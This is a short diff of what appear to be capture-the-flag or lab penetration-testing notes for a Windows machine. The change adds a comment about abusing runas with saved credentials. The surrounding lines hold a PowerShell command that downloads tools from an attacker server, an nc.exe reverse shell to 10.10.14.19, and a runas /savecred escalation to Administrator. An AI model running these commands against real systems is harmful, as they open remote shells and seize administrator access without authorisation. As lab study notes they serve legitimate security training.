@@ -20,6 +20,7 @@ powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://
 
 echo c:\Users\security\Desktop\nc.exe 10.10.14.19 6789 -e cmd.exe > reverse.ba
 
+#Runas can be exploited if net user Administrator have "No Password Required Option" enabled
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\Desktop\reverse.bat" 
 
 powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.19:8000/SeatbeltNet3.5AnyCPU.exe', 'sb.exe')"
